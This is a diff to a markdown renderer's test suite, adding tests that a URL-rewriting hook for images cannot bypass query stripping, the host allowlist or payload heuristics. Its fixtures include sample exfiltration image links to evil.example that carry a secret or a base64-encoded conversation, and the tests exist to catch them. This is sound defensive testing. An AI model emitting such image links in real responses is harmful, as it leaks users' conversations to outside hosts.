@@ -308,7 +308,7 @@ describe('grouped policy and the urls.decide hook', () => {
     expect(decisions.some((d) => d.code === 'url-rewritten' && d.reason === 'redirected')).toBe(true);
   });
 
-  it('urls.decide runs on images before the image policy, and a deny shows the placeholder', () => {
+  it('urls.decide runs on images after the image checks, and a deny shows the placeholder', () => {
     const target = box();
     createRenderer({
       policy: {
@@ -318,6 +318,53 @@ describe('grouped policy and the urls.decide hook', () => {
     }).renderMarkdownInto(target, '![x](https://cdn.example/block.png) ![y](https://cdn.example/ok.png)');
     expect([...target.querySelectorAll('img')].map((i) => i.getAttribute('src'))).toEqual(['https://cdn.example/ok.png']);
     expect(target.querySelector('a.rp-blocked-image')).not.toBeNull();
+  });
+
+  describe('a decide rewrite to a same-origin proxy does not launder an image', () => {
+    const proxy = (url: URL): string => `/img-proxy?url=${encodeURIComponent(url.href)}`;
+    const payload = Buffer.from('the whole conversation, base64-encoded '.repeat(6)).toString('base64');
+    const seen: string[] = [];
+    const renderer = (hosts: 'any' | string[]) =>
+      createRenderer({
+        policy: {
+          images: { hosts },
+          urls: {
+            decide: (url, ctx) => {
+              if (ctx.subject !== 'image') return null;
+              seen.push(url.href);
+              return { rewrite: proxy(url), reason: 'proxied' };
+            },
+          },
+        },
+      });
+
+    it('strips the query before decide sees the URL', () => {
+      seen.length = 0;
+      const target = box();
+      const { decisions } = renderer('any').renderMarkdownInto(target, '![x](https://evil.example/a.png?q=secret#frag)');
+      expect(seen).toEqual(['https://evil.example/a.png']);
+      expect(target.querySelector('img')?.getAttribute('src')).toBe('/img-proxy?url=https%3A%2F%2Fevil.example%2Fa.png');
+      expect(decisions.some((d) => d.code === 'image-query-stripped')).toBe(true);
+      expect(decisions.some((d) => d.code === 'url-rewritten' && d.reason === 'proxied')).toBe(true);
+    });
+
+    it('keeps the host allowlist: an unlisted host is blocked and never reaches decide', () => {
+      seen.length = 0;
+      const target = box();
+      const { decisions } = renderer(['cdn.example']).renderMarkdownInto(target, '![x](https://evil.example/a.png) ![y](https://cdn.example/b.png)');
+      expect(seen).toEqual(['https://cdn.example/b.png']);
+      expect([...target.querySelectorAll('img')].map((i) => i.getAttribute('src'))).toEqual(['/img-proxy?url=https%3A%2F%2Fcdn.example%2Fb.png']);
+      expect(target.querySelector('a.rp-blocked-image')?.getAttribute('href')).toBe('https://evil.example/a.png');
+      expect(decisions.some((d) => d.code === 'image-host-not-allowed')).toBe(true);
+    });
+
+    it('keeps the heuristics: an encoded payload in the path is blocked and never reaches decide', () => {
+      seen.length = 0;
+      const target = box();
+      renderer('any').renderMarkdownInto(target, `![x](https://evil.example/${payload}.png)`);
+      expect(seen).toEqual([]);
+      expect(target.querySelector('img')).toBeNull();
+    });
   });
 
   it('a urls.decide that throws drops that URL and the render goes on', () => {
